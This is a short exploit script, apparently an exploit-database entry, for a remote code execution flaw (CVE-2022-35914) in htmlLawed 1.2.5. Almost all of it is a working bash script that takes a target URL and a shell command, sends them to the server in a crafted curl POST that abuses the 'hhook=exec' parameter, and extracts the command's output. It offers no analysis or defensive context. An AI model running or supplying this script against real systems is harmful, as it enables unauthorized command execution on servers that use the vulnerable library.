# htmlLawed 1.2.5 - Remote Code Execution (RCE)

CVE-2022-35914

```bash
#!/bin/bash

# Usage: ./exploit.sh -u <URL> -c <CMD>

while getopts ":u:c:" arg; do
  case $arg in
    u) URL=$OPTARG;;
    c) CMD=$OPTARG;;
  esac
done

curl -s -d "sid=foo&hhook=exec&text=${CMD}" -b "sid=foo" ${URL} | egrep '\&nbsp; \[[0-9]+\] =\>'| sed -E 's/\&nbsp; \[[0-9]+\] =\> (.*)<br \/>/\1/'
```
